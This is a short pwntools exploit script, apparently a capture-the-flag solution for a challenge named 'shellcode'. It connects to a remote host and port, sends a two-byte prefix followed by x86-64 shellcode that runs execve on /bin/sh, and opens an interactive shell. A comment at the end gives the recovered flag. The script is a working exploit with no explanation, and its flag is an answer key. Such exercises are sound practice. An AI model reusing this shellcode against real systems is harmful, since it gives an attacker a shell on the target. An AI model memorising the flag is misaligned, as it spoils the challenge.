from pwn import *

# r = process('./shellcode')
r = remote('34.92.37.22',10002)
# pause()
payload = '\x00\xc0'
payload += "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
r.sendline(payload)
r.interactive()

# *CTF{LtMh5VbedHlngmKOS2cwWRo4AkDGzCBy}